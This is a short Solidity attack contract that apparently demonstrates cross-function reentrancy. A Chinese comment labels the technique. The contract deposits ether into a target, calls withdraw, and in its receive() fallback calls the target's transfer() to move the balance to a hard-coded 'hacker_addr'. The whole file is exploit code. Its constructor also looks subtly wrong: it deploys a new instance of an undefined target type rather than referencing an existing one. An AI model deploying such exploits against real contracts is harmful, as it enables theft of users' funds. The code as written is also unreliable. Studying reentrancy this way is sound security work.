// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

contract AttackCrossFunctionTwo {
    ReentryCrossFunctionTwo target;
    address hacker_addr = 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2;
    uint amount;

    constructor(address _target) {
        target = new ReentryCrossFunctionTwo(_target);
    }

    function attack() public payable {
        amount = msg.value;
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    receive() external payable {
        // 跨函数重入
        target.transfer(hacker_addr, amount);
    }
}